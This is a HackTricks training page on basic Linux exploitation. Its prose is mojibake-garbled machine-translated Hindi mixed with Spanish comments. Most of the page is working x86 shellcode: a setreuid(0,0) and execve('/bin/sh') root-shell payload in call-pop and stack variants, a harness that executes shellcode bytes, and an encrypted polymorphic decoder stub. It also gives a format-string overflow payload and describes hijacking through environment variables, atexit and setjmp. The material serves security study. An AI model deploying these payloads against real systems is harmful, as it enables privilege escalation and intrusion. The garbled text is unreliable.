# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

‡§ï‡§∞‡•ç‡§®‡•á‡§≤ ‡§á‡§Ç‡§ü‡§∞‡§™‡•ç‡§∂‡§® ‡§¶‡•á‡§ñ‡•á‡§Ç: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax ‡§ï‡•ã ‡§∏‡§æ‡§´ ‡§ï‡§∞‡•á‡§Ç\
xor ebx, ebx ; ebx = 0 ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§ï‡•ã‡§à ‡§§‡§∞‡•ç‡§ï ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; syscall ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç

**nasm -f elf assembly.asm** ‚Äî> ‡§π‡§Æ‡•á‡§Ç ‡§è‡§ï .o ‡§¶‡•á‡§§‡§æ ‡§π‡•à\
**ld assembly.o -o shellcodeout** ‚Äî> ‡§π‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§Ø‡•ã‡§ó‡•ç‡§Ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Ö‡§∏‡•á‡§Ç‡§¨‡§≤‡•Ä ‡§ï‡•ã‡§° ‡§∏‡•á ‡§¨‡§®‡§æ ‡§π‡•à ‡§î‡§∞ ‡§π‡§Æ **objdump** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ë‡§™‡§ï‡•ã‡§° ‡§®‡§ø‡§ï‡§æ‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç\
**objdump -d -Mintel ./shellcodeout** ‚Äî> ‡§Ø‡§π ‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø ‡§Ø‡§π ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ ‡§Æ‡•á‡§Ç ‡§π‡§Æ‡§æ‡§∞‡•Ä ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§π‡•à ‡§î‡§∞ ‡§ë‡§™‡§ï‡•ã‡§° ‡§®‡§ø‡§ï‡§æ‡§≤‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è

**‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç ‡§ï‡§ø ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para ver que las llamadas al sistema se realizan correctamente se debe compilar el programa anterior y las llamadas del sistema deben aparecer en **strace ./PROGRAMA\_COMPILADO**

‡§è‡§ï ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§∏‡§Æ‡§Ø ‡§è‡§ï ‡§ü‡•ç‡§∞‡§ø‡§ï ‡§ï‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§ ‡§™‡§π‡§≤‡•Ä ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ ‡§è‡§ï ‡§ï‡•â‡§≤ ‡§™‡§∞ ‡§ú‡§Ç‡§™ ‡§π‡•à‡•§ ‡§ï‡•â‡§≤ ‡§Æ‡•Ç‡§≤ ‡§ï‡•ã‡§° ‡§ï‡•ã ‡§¨‡•Å‡§≤‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç EIP ‡§°‡§æ‡§≤‡§§‡§æ ‡§π‡•à‡•§ ‡§ï‡•â‡§≤ ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ ‡§ï‡•á ‡§¨‡§æ‡§¶, ‡§π‡§Æ‡§®‡•á ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó ‡§°‡§æ‡§≤‡•Ä ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è ‡§â‡§∏ EIP ‡§ï‡•á ‡§∏‡§æ‡§• ‡§π‡§Æ ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ ‡§ï‡•ã‡§° ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§ú‡§æ‡§∞‡•Ä ‡§∞‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**‡§à‡§ú‡•á ‡§è‡§´‡§è‡§®‡§è‡§∏‡§ü‡•Ä‡§à‡§è‡§®‡§µ‡•Ä:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Huter:**

‡§Ø‡§π ‡§è‡§ï ‡§õ‡•ã‡§ü‡§æ ‡§ï‡•ã‡§° ‡§π‡•à ‡§ú‡•ã ‡§è‡§ï ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡•á ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§™‡•É‡§∑‡•ç‡§†‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•ç‡§ï‡•à‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§µ‡§π‡§æ‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ shellcode ‡§ï‡•ã ‡§ñ‡•ã‡§ú‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á (‡§Ø‡§π shellcode ‡§Æ‡•á‡§Ç ‡§∞‡§ñ‡•Ä ‡§ó‡§à ‡§ï‡§ø‡§∏‡•Ä ‡§π‡§∏‡•ç‡§§‡§æ‡§ï‡•ç‡§∑‡§∞ ‡§ï‡•ã ‡§ñ‡•ã‡§ú‡§§‡§æ ‡§π‡•à)‡•§ ‡§Ø‡§π ‡§â‡§® ‡§Æ‡§æ‡§Æ‡§≤‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§π‡•à ‡§ú‡§π‡§æ‡§Ç ‡§ï‡•ã‡§° ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•á‡§µ‡§≤ ‡§è‡§ï ‡§õ‡•ã‡§ü‡§æ ‡§∏‡•ç‡§•‡§æ‡§® ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§

**Shellcodes polim√≥rficos**

‡§Ø‡§π ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§∂‡•á‡§≤‡•ç‡§∏ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§®‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§õ‡•ã‡§ü‡§æ ‡§ï‡•ã‡§° ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§â‡§∏ ‡§™‡§∞ ‡§ï‡•Ç‡§¶‡§§‡§æ ‡§π‡•à, Call-Pop ‡§ï‡•á ‡§ü‡•ç‡§∞‡§ø‡§ï ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è, ‡§Ø‡§π ‡§è‡§ï **‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§∏‡•Ä‡§ú‡§º‡§∞** ‡§π‡•ã‡§ó‡§æ:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5.‡§™‡•Ç‡§∞‡§ï ‡§µ‡§ø‡§ß‡§ø‡§Ø‡§æ‡§Å**

**‡§Æ‡•Å‡§∞‡§æ‡§§ ‡§§‡§ï‡§®‡•Ä‡§ï**

‡§≤‡§ø‡§®‡§ï‡•ç‡§∏ ‡§Æ‡•á‡§Ç ‡§∏‡§≠‡•Ä ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ 0xbfffffff ‡§∏‡•á ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã‡§ï‡§∞ ‡§Æ‡•à‡§™ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§≤‡§ø‡§®‡§ï‡•ç‡§∏ ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§®‡§è ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§ï‡•Ä ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•à‡§∏‡•á ‡§¨‡§®‡§æ‡§à ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à, ‡§Ø‡§π ‡§¶‡•á‡§ñ‡§ï‡§∞ ‡§è‡§ï ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§µ‡§ø‡§ï‡§∏‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§è‡§ï ‡§ê‡§∏‡•á ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã, ‡§ú‡§ø‡§∏‡§ï‡•Ä ‡§è‡§ï‡§Æ‡§æ‡§§‡•ç‡§∞ ‡§µ‡•à‡§∞‡§ø‡§è‡§¨‡§≤ ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§π‡•ã‡•§ ‡§á‡§∏‡§ï‡§æ ‡§™‡§§‡§æ ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§≤‡§ó‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞, ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•á ‡§∏‡§æ‡§• ‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£ ‡§µ‡•à‡§∞‡§ø‡§è‡§¨‡§≤ ‡§ï‡§æ ‡§™‡§§‡§æ ‡§∏‡§∞‡§≤‡§§‡§æ ‡§∏‡•á ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

‡§Ø‡§π execle ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§ï‡§æ‡§∞‡§£ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à, ‡§ú‡•ã ‡§è‡§ï ‡§ê‡§∏‡§æ ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§ï‡•á‡§µ‡§≤ ‡§á‡§ö‡•ç‡§õ‡§ø‡§§ ‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£ ‡§µ‡•à‡§∞‡§ø‡§è‡§¨‡§≤ ‡§π‡•ã‡§Ç‡•§

### **‡§¨‡§´‡§∞ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ï‡•á ‡§≤‡§ø‡§è ‡§´‡•â‡§∞‡•ç‡§Æ‡•á‡§ü ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó‡•ç‡§∏**

**sprintf** ‡§è‡§ï ‡§´‡•â‡§∞‡•ç‡§Æ‡•á‡§ü‡•á‡§° ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§è‡§ï ‡§µ‡•à‡§∞‡§ø‡§è‡§¨‡§≤ ‡§Æ‡•á‡§Ç **‡§∏‡•ç‡§•‡§æ‡§®‡§æ‡§Ç‡§§‡§∞‡§ø‡§§** ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ü‡§™ ‡§è‡§ï ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó ‡§ï‡•á **‡§´‡•â‡§∞‡•ç‡§Æ‡•á‡§ü‡§ø‡§Ç‡§ó** ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§è‡§ï **‡§¨‡§´‡§∞ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§π‡•ã** ‡§â‡§∏ ‡§µ‡•à‡§∞‡§ø‡§è‡§¨‡§≤ ‡§Æ‡•á‡§Ç ‡§ú‡§π‡§æ‡§Ç ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§ï‡•â‡§™‡•Ä ‡§ï‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à‡•§\
‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§™‡•á‡§≤‡•ã‡§° `%.44xAAAA` **44B+"AAAA" ‡§ï‡•ã ‡§µ‡•à‡§∞‡§ø‡§è‡§¨‡§≤ ‡§Æ‡•á‡§Ç ‡§≤‡§ø‡§ñ‡•á‡§ó‡§æ**, ‡§ú‡•ã ‡§¨‡§´‡§∞ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ï‡§æ ‡§ï‡§æ‡§∞‡§£ ‡§¨‡§® ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

### **\_\_atexit ‡§∏‡§Ç‡§∞‡§ö‡§®‡§æ‡§è‡§Å**

{% hint style="danger" %}
‡§Ü‡§ú‡§ï‡§≤ ‡§á‡§∏‡•á **‡§∂‡•ã‡§∑‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§¨‡§π‡•Å‡§§ ‡§Ö‡§ú‡•Ä‡§¨ ‡§π‡•à**‡•§
{% endhint %}

**`atexit()`** ‡§è‡§ï ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç **‡§Ö‡§®‡•ç‡§Ø ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§∏ ‡§ï‡§ø‡§è ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç‡•§** ‡§Ø‡•á **‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§®** ‡§§‡§¨ **‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§** ‡§π‡•ã‡§Ç‡§ó‡•á ‡§ú‡§¨ **`exit()`** ‡§Ø‡§æ **‡§Æ‡•Å‡§ñ‡•ç‡§Ø** ‡§ï‡§æ **‡§∞‡§ø‡§ü‡§∞‡•ç‡§®** ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§\
‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§á‡§® **‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§®‡•ã‡§Ç** ‡§Æ‡•á‡§Ç ‡§∏‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§ï‡•á **‡§™‡§§‡•á** ‡§ï‡•ã ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è **‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™ **‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏** ‡§™‡§∞ **‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ø‡§π ‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® ‡§Æ‡•á‡§Ç ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§ü‡§ø‡§≤ ‡§π‡•à‡•§\
‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® ‡§Æ‡•á‡§Ç ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§π‡•ã‡§®‡•á ‡§µ‡§æ‡§≤‡•á **‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§®‡•ã‡§Ç ‡§ï‡•á ‡§™‡§§‡•á** ‡§ï‡§à ‡§∏‡§Ç‡§∞‡§ö‡§®‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§™‡•Ä‡§õ‡•á **‡§õ‡§ø‡§™‡•á** ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§Ö‡§Ç‡§§‡§§‡§É ‡§ú‡§ø‡§∏ ‡§™‡§§‡•á ‡§ï‡•Ä ‡§ì‡§∞ ‡§µ‡•á ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§µ‡•á ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§®‡•ã‡§Ç ‡§ï‡•á ‡§™‡§§‡•á ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡•á, ‡§¨‡§≤‡•ç‡§ï‡§ø **XOR** ‡§î‡§∞ ‡§è‡§ï **‡§Ø‡§æ‡§¶‡•É‡§ö‡•ç‡§õ‡§ø‡§ï ‡§ï‡•Å‡§Ç‡§ú‡•Ä** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§µ‡§ø‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§á‡§∏‡§≤‡§ø‡§è ‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® ‡§Æ‡•á‡§Ç ‡§Ø‡§π ‡§π‡§Æ‡§≤‡§æ ‡§µ‡•á‡§ï‡•ç‡§ü‡§∞ **‡§ï‡§Æ ‡§∏‡•á ‡§ï‡§Æ x86** ‡§î‡§∞ **x64\_86** ‡§™‡§∞ **‡§¨‡§π‡•Å‡§§ ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à**‡•§\
**‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§®** **`PTR_MANGLE`** ‡§π‡•à‡•§ **‡§Ö‡§®‡•ç‡§Ø ‡§Ü‡§∞‡•ç‡§ï‡§ø‡§ü‡•á‡§ï‡•ç‡§ö‡§∞** ‡§ú‡•à‡§∏‡•á m68k, mips32, mips64, aarch64, arm, hppa... **‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§®** ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§≤‡§æ‡§ó‡•Ç ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡•á ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§π **‡§â‡§∏‡•Ä** ‡§ï‡•ã ‡§≤‡•å‡§ü‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§á‡§∏‡•á ‡§á‡§®‡§™‡•Å‡§ü ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡•á ‡§Ü‡§∞‡•ç‡§ï‡§ø‡§ü‡•á‡§ï‡•ç‡§ö‡§∞ ‡§á‡§∏ ‡§µ‡•á‡§ï‡•ç‡§ü‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§π‡§Æ‡§≤‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§π‡•ã‡§Ç‡§ó‡•á‡•§

### **setjmp() & longjmp()**

{% hint style="danger" %}
‡§Ü‡§ú‡§ï‡§≤ ‡§á‡§∏‡•á **‡§∂‡•ã‡§∑‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§¨‡§π‡•Å‡§§ ‡§Ö‡§ú‡•Ä‡§¨ ‡§π‡•à**‡•§
{% endhint %}

**`setjmp()`** **‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠** (‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞) ‡§ï‡•ã **‡§∏‡§π‡•á‡§ú‡§®‡•á** ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§\
**`longjmp()`** ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠ ‡§ï‡•ã **‡§™‡•Å‡§®‡§∞‡•ç‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§** ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§\
**‡§∏‡§π‡•á‡§ú‡•á ‡§ó‡§è ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞** ‡§π‡•à‡§Ç: `EBX, ESI, EDI, ESP, EIP, EBP`\
‡§ú‡•ã ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§µ‡§π ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø EIP ‡§î‡§∞ ESP **`PTR_MANGLE`** ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§™‡§æ‡§∏ ‡§ï‡§ø‡§è ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç, ‡§á‡§∏‡§≤‡§ø‡§è ‡§á‡§∏ ‡§π‡§Æ‡§≤‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§Ü‡§∞‡•ç‡§ï‡§ø‡§ü‡•á‡§ï‡•ç‡§ö‡§∞ ‡§µ‡§π‡•Ä ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§ä‡§™‡§∞ ‡§π‡•à‡§Ç‡•§\
‡§Ø‡•á ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§™‡•Å‡§®‡§∞‡•ç‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§‡§ø ‡§Ø‡§æ ‡§á‡§Ç‡§ü‡§∞‡§™‡•ç‡§ü ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç‡•§\
